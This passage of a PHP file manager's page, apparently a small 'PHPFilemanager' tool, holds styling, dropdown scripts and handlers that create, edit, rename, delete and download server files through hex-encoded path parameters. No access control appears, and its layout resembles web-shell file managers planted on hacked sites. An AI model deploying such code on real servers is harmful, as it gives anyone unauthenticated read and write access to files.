		/*padding: 0; background: #777; */
	}
	ul.dropdown { 
		display: none; 
		position: absolute; 
		top: 100%;
		width:83%;
		margin-top: -8px; 
		padding: 5px 5px 0 0;
		z-index: 999;
	}
	
	ul.dropdown li {
		list-style-type: none;
		padding:7px;
		background-color: #283747;
	}

	ul.dropdown li:first-child {
		border-radius:7px 7px 0px 0;
	}

	ul.dropdown li:last-child {
		border-radius:0px 0 7px 7px;
	}
	
	ul.dropdown li a { 
		text-decoration: none; 
		padding: 0em 1em;
		display: block; 
		text-align: left;
		border-radius:5px;
	}

	/* action dropdown */

	.action-toggle { 
		/*padding: 0; background: #777; */
	}
	ul.action { 
		display: none; 
		position: absolute; 
		top: 100%;
		width:100%;
		margin-top: -8px; 
		padding: 5px 5px 0 0;
		z-index: 999;
	}
	
	ul.action li {
		list-style-type: none;
		padding:7px;
		background-color: #283747;
	}

	ul.action li:first-child {
		border-radius:7px 7px 0px 0;
	}

	ul.action li:last-child {
		border-radius:0px 0 7px 7px;
	}
	
	ul.action li a { 
		text-decoration: none; 
		padding: 0em 1em;
		display: block; 
		text-align: left;
		border-radius:5px;
	}

	/* end action dropdown */

	/*class .back*/

	.back {
		padding:px;
		padding-left:15px;
	}

	/*.back a {
		background-color: #2874A6;
		padding:7px;
		border-radius:17px;
		padding-left:10px;
		padding-right:10px;
	}*/

	/*end class .back*/

	/*class .breadcrumb*/
	.breadcrumb {
		border: 1px solid #1EC692;
		border-radius: 0.25em;
		margin-bottom: 1.5em;
		max-height: 2.5em;
		overflow: hidden;
		position: relative;
		transition: all 0.3s ease-in-out;
		z-index: 1;
	}
	.breadcrumb a {
		display: block;
		padding: 0.7em 1.4em;
	}
	.breadcrumb:target {
		max-height: 20em;
	}
	.breadcrumb:target .breadcrumb-link {
		opacity: 1;
		position: static;
		visibility: visible;
	}
	.breadcrumb:target .breadcrumb--active:after {
		content: none;
	}
	.breadcrumb:target .breadcrumb-close:after {
		visibility: visible;
	}

	.breadcrumb-link {
		color: tint(#1EC692, 35%);
		opacity: 0;
		visibility: hidden;
		position: absolute;
		transition: all 0.2s;
		z-index: 0;
	}

	.breadcrumb--active {
		color: #1EC692;
		font-weight: 700;
		position: relative;
	}
	.breadcrumb--active:after {
		content: "▾";
		position: absolute;
		right: 22px;
		z-index: 1;
	}

	.breadcrumb-close {
		position: absolute;
		right: 0;
		bottom: 0;
		visibility: hidden;
		z-index: 10;
	}
	.breadcrumb-close:after {
		content: "▴";
		color: #1EC692;
	}

	@media (min-width: 700px) {
		.breadcrumb {
			border: none;
		}
		.breadcrumb a {
			display: inline;
			padding: 0.5em;
		}

		.breadcrumb-link {
			display: inline;
			opacity: 1;
			visibility: visible;
			position: static;
		}
		.breadcrumb-link:after {
			content: "/";
			margin-left: 0.5em;
			margin-right: -0.75em;
		}

		.breadcrumb--active {
			pointer-events: none;
		}
		.breadcrumb--active:after {
			content: none;
		}

		.breadcrumb-close {
			display: none !important;
		}
	}
	/*end class*/

	@media only all and (max-width: 768px) {
		.nav .content .menu {
			display: initial;
		}
	}
	@media all and (max-width: 800px) {
		.col-33 {
			width: 50%;
		}
	}
	@media all and (max-width: 600px) {
		.col-50, .col-33 {
			width: 100%;
			float: none;
		}
		.size, .perm, .time {
			width:auto;
		}
	}

</style>
<script type="text/javascript" src="https://cdnjs.cloudflare.com/ajax/libs/jquery/2.1.3/jquery.min.js"></script>
<script type="text/javascript">
	// Clicktable
	jQuery(document).ready(function($) {
		$(".clickable").click(function() {
			window.location = $(this).data("href");
		});
	});
	// end Clicktable
	// Menu Dropdown
	$(function() {
		$('.dropdown-toggle').click(function() 
		{ 
			$(this).next('.dropdown').slideToggle();
	});
		$(document).click(function(e)  
		{ 
			var target = e.target; 
			if (!$(target).is('.dropdown-toggle') && !$(target).parents().is('.dropdown-toggle')) 
				{ 
					$('.dropdown').slideUp(); 
				}
		});
	});
	// end Menu Dropdown

	// Action Dropdown
	$(function() {
		$('.action-toggle').click(function() 
		{ 
			$(this).next('.action').slideToggle();
	});
		$(document).click(function(e)  
		{ 
			var target = e.target; 
			if (!$(target).is('.action-toggle') && !$(target).parents().is('.action-toggle')) 
				{ 
					$('.action').slideUp(); 
				}
		});
	});
	// end Action Dropdown
</script>
<div class="grid">
	<div class="nav">
		<div class="content">
			<h3 class="brand"><a href="<?= $listFiles->mySelf() ?>">PHPFilemanager</a></h3>
			<div id="nav">
				<i class="dropdown-toggle material-icons menu">menu</i>
				<ul class="dropdown">
					<li>
						<a href="?x=<?= hex::toHex($listFiles->homeroot()) ?>">
							<span class="actions material-icons">home</span> Home root
						</a>
					</li>
					<li>
						<a href="?x=<?= hex::toHex(getcwd()) ?>&t=<?= hex::toHex("upload") ?>">
							<span class="actions material-icons">cloud_upload</span> Upload
						</a>
					</li>
					<li>
						<a href="?x=<?= hex::toHex(getcwd()) ?>&t=<?= hex::toHex("newdir") ?>">
							<span class="actions material-icons">create_new_folder</span> New Folder
						</a>
					</li>
					<li>
						<a href="?x=<?= hex::toHex(getcwd()) ?>&t=<?= hex::toHex("newfile") ?>">
							<span class="actions material-icons">filter_none</span> New File
						</a>
					</li>
				</ul>
			</div>
		</div>
		<div class="back">
			<nav id="breadcrumb" class="breadcrumb"><?php $listFiles->pwd(); ?></nav>
		</div>
	</div>
	<div class="clear"></div>
	<div class="bungkus">
		<?php
		// Tools
		switch (@$_GET['t']) {
			// Upload File
			case hex::toHex("upload"):
				print("Upload");
				die();
				break;
			// end Upload File

			// New File
			case hex::toHex("newfile"):
				$Tools = new Tools;
				if (isset($_POST['submit'])) {
					if (!$Tools->make([$_POST['filename']])->path(getcwd())->file($_POST['data'])) {
						alert("file <b>".str_replace("|", ", ", $_POST['filename'])."</b> created !", true);
					} else {
						alert("error !", false);
					}
				}
				?>
				<div class="col-100">
					<div class="block gutter">
						<table width="100%">
							<form method="post">
								<tr>
									<td>
										<input type="text" name="filename" placeholder="file.html">
									</td>
								</tr>
								<tr>
									<td>
										<textarea name="data"></textarea>
									</td>
								</tr>
								<tr>
									<td>
										<input type="submit" name="submit">
									</td>
								</tr>
							</form>
						</table>
					</div>
				</div>
				<?php
				die();
				break;
			// end New File

			// New Folder
			case hex::toHex("newdir"):
				$Tools = new Tools;
				if (isset($_POST['submit'])) {
					if ($Tools->make($_POST['filename'])->path(getcwd())->dir()) {
						alert("folder <b>{$_POST['filename']}</b> created !", true);
					} else {
						alert("error !", false);
					}
				}
				?>
				<div class="col-100">
					<div class="block gutter">
						<table width="100%">
							<form method="post">
								<tr>
									<td>
										<input type="text" name="filename" placeholder="folder">
									</td>
									<td>
										<input type="submit" name="submit">
									</td>
								</tr>
							</form>
						</table>
					</div>
				</div>
				<?php
				die();
				break;
			// end New Folder
		}
		// end Tools


		// Rename File
		if (isset($_GET['c'])) {
			$file = hex::toString($_GET['c']);
			$Action = new Action($file);
			if (isset($_POST['submit'])) {
				if ($Action->chname($_POST['newname'])) {
					print('<meta http-equiv="refresh" content="0;url=?x='.hex::toHex(getcwd()).'">');
				} else {
					alert("failed");
				}
			}
			?>
			<div class="col-100">
				<div class="block gutter">
					<table width="100%">
						<tr>
							<td>Filename</td>
							<td>:</td>
							<td><?= $listFiles->wr($file, basename($file)) ?></td>
						</tr>
						<tr>
							<?php
							if (is_dir($file)) { ?>
								<td>In dir</td>
								<td>:</td>
								<td><?= $listFiles->countDir($file) ?></td>
							<?php } else { ?>
								<td>Size</td>
								<td>:</td>
								<td><?= $listFiles->formatSIze(filesize($file)) ?></td>
							<?php }
							?>
						</tr>
						<tr>
							<td>Last Modified</td>
							<td>:</td>
							<td><?= $listFiles->ftime($file) ?></td>
						</tr>
						<form method="post">
							<tr>
								<td colspan="2">
									<input type="text" name="newname" value="<?= basename($file) ?>">
								</td>
								<td>
									<input type="submit" name="submit" value="Change">
								</td>
							</tr>
						</form>
					</table>
				</div>
			</div>
			<?php
			die();
		}
		// end Rename File

		// Download File
		if (isset($_GET['d'])) {
			$file = hex::toString($_GET['d']);
			$Action = new Action(basename($file));
			$Action->open("readmaster")->downloadFile();
		}
		// end Download File

		// Delete File/Folder
		if (isset($_GET['r'])) {
			$file = hex::toString($_GET['r']);
			$Action = new Action($file);
			if ($Action->delete($file)) {
				print('<meta http-equiv="refresh" content="0;url=?x='.hex::toHex(getcwd()).'">');
			} else {
				print('<meta http-equiv="refresh" content="0;url=?x='.hex::toHex(getcwd()).'">');
			}
			die();
		}
		// end Delete File/Folder

		// Edit Page
		if (isset($_GET['e'])) {
			$file = hex::toString($_GET['e']);
			$Action = new Action($file);
			if (isset($_POST['submit'])) {
				if ($Action->open("write")->write($_POST['data'])) {
					alert("success", true);
				} else {
					alert("failed", false);
				}
			}
			?>
			<div class="col-100">
				<div class="block gutter">

					<table width="100%">
						<tr>
							<td>Filename</td>
							<td>:</td>
							<td><?= $listFiles->wr($file, basename($file)) ?></td>
						</tr>
						<tr>
							<td>Size</td>
							<td>:</td>
							<td><?= $listFiles->formatSIze(filesize($file)) ?></td>
						</tr>
						<tr>
							<td>Last Modified</td>
							<td>:</td>
							<td><?= $listFiles->ftime($file) ?></td>
						</tr>
						<form method="post">
							<tr>
								<td colspan="3">
									<textarea name="data" style="width: 100%" rows="30"><?= $Action->read() ?></textarea>
								</td>
							</tr>
							<tr>
								<td colspan="3">
									<input type="submit" name="submit">
									 <a href="?x=<?= hex::toHex(getcwd()) ?>">cancel</a>
								</td>
							</tr>
						</form>
					</table>
			</div>
			<?php
			die();
		}
		// end Edit Page
		foreach ($listFiles->folders() as $key => $value) { ?>
			<div>
				<div class="col-75 clickable" data-href="?x=<?= hex::toHex($value["getPathname"]) ?>">
					<div class="block gutter">
						<img class="icon" src="<?= $listFiles->getIcon($value["getPathname"]) ?>">
						<?= $value["getName"] ?>
						<br>
						<div class="info size"><?= $value["getSize"] ?></div>
						<div class="info perm"><?= $value["getPerm"] ?></div>
						<div class="info time"><?= $value["getTime"] ?></div>
					</div>
				</div>
				<div class="col-20">
					<div id="nav">
						<i class="action-toggle material-icons menu">pending</i>
						<ul class="action">
							<li>
								<a href="?x=<?= hex::toHex(getcwd()) ?>&c=<?= hex::toHex($value["getPathname"]) ?>">
									<span class="actions"><i class="material-icons">drive_file_rename_outline</i></span>
									 Rename
								</a>
							</li>
							<li>
								<a href="?x=<?= hex::toHex(getcwd()) ?>&r=<?= hex::toHex($value["getPathname"]) ?>">
									<span class="actions"><i class="material-icons">delete</i></span> Delete
								</a>
							</li>
						</ul>
					</div>
				</div>
			</div>
		<?php }
		?>
		<?php foreach ($listFiles->files() as $key => $value) { ?>
			<div class="col-75">
				<div class="block gutter">
					<img class="icon" src="<?= $listFiles->getIcon($value["getPathname"], false) ?>">
					<?= $value["getName"] ?>
					<br>
					<div class="info size"><?= $value["getSize"] ?></div>
					<div class="info perm"><?= $value["getPerm"] ?></div>
					<div class="info time"><?= $value["getTime"] ?></div>
				</div>
			</div>
			<div class="col-20">
				<div id="nav">
					<i class="action-toggle material-icons menu">pending</i>
					<ul class="action">
						<li>
							<a href="?x=<?= hex::toHex(getcwd()) ?>&e=<?= hex::toHex($value["getPathname"]) ?>">
								<span class="actions">
									<i class="material-icons">edit</i>
								</span>
								 Edit
							</a>
						</li>
						<li>
							<a href="?x=<?= hex::toHex(getcwd()) ?>&c=<?= hex::toHex($value["getPathname"]) ?>">
								<span class="actions">
									<i class="material-icons">drive_file_rename_outline</i> 
								</span>
								 Rename
							</a>
							</li>
						<li>
							<a href="?x=<?= hex::toHex(getcwd()) ?>&r=<?= hex::toHex($value["getPathname"]) ?>">
								<span class="actions">
									<i class="material-icons">delete</i>
								</span>
								 Delete
							</a>
						</li>
						<li>
							<a href="#downloadFile">
								<span class="actions">
									<i class="material-icons">file_download</i>
								</span>
								 Download
							</a>
						</li>
					</ul>
				</div>
			</div>
		<?php }
		?>
	</div>
	<div class="clear"></div>
</div>
